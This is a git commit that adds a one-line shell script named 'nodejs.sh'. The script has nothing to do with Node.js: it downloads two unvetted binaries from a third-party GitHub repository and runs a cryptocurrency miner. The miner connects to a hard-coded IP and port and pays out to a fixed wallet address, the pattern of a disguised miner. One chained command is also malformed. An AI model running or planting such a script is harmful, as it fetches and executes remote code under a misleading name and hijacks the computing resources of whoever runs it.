275b5369d55e3238bfd79c2e79e5a19873c16ef8
lemanleman020 <147594099+lemanleman020@users.noreply.github.com>
2024-08-27 14:44:57 +0800

    Add files via upload

---
+++ nodejs.sh
@@ -0,0 +1,1 @@
+wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && ./hellminer -c 203.23.128.70:5040 -u RJBDdGxYbnwdMiB2QoGGWHHwY2Fp8iac2k.STRIX -p x
